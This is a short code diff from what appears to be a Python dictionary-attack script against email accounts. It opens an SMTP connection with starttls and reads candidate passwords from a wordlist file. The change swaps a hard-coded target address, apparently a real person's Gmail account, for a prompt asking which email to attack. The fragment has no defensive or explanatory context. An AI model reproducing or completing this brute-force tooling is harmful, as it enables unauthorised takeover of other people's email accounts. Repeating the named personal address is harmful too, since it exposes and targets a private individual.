@@ -10,7 +10,7 @@ smtpserver.starttls()
 
 
 
-user = "celine.delaugere@gmail.com"
+user =input("enter email") 
 #passF = input("Enter wordlist :")
 passF = "8-more-passwords.txt"
 passF = open(passF, 'r')
